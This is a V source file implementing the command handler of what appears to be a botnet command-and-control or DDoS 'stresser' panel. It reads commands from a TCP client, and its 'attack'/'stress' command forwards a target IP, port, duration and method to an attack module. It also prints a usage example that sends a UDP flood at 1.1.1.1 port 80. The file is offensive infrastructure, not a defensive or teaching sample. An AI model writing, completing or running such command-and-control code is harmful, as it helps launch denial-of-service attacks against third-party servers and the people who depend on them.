module server

import os
import io
import net
import time
import config
import utils
import server
import skrillec_cp
import attack_system

pub struct Current{
	pub mut:	
		fullcmd		string
		cmd			string
		cmd_args	[]string
}

pub fn (mut c Current) handle_cmd(data string) {
	c.fullcmd = data
	if data.contains(" ") {
		c.cmd_args = data.split(" ")
		c.cmd = c.cmd_args[0]
	} else {
		c.cmd_args = data.split(" ")
		c.cmd = data
	}
}

pub fn (mut c Current) reset_cmd_data() {
	c.fullcmd = ""
	c.cmd = ""
	c.cmd_args = ["", ""]
}

pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current) {
	mut reader := io.new_buffered_reader(reader: socket)

	for {
		// Grabbing output position for the CNC responses
		config_f := os.read_file(os.getwd() + "/assets/config.skrillec") or { "" }
		// Output CNC Information
		mut output_p := utils.parse(config_f, "CNC_Output", "cnc_output_position").split(",")
		/*================================================================================*/
		// Cursor Position Information
		mut cursor_p := utils.parse(config_f, "Hostname", "cli_cursor").split(",")
		/*================================================================================*/

		// Command Handling
		mut data := reader.read_line() or { "" }
		if data.len > 0 { // Dont do anything if the input doesnt have a character!
			c.handle_cmd(data) // Configuring CurrentCmd Infomartion
			utils.output_ui(mut socket, svr.clients.get_username(mut socket)) // Outputs the UI
			time.sleep(500*time.millisecond) // sleep 2 seconds bc if u use ANSI after socket output then the ASNI can run first even if the code is after the socket output
			utils.place_text(mut socket, 13, 41, data.replace("\r\n", "")) // Placing 'Last Command'
			
			// Parse command here with a match statement
			match c.cmd {
				"home", "clear", "cls", "c" {

				}
				"passwd" {

				}
				"help" {

				}
				"methods" {
             		println("TEST METHODS")
				}
				"attack", "stress" {
             		if c.cmd_args.len > 3 {
						 attack_system.attack(c.cmd_args[1], c.cmd_args[2], c.cmd_args[3], c.cmd_args[4])
						 utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "Attack has been sent to: ${c.cmd_args[1]}:${c.cmd_args[2]} for ${c.cmd_args[3]}\r\n")
					} else {
						utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "[x] Error, Invalid argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExample: attack 1.1.1.1 80 30 UDP\r\n")
					}
				} else {
					time.sleep(500*time.millisecond)
					utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "Command not found!\r\n")
				}
			}
			println(data)
			time.sleep(500*time.millisecond)
			utils.place_text(mut socket, cursor_p[0].int(), cursor_p[1].int(), "")
		}
	}
}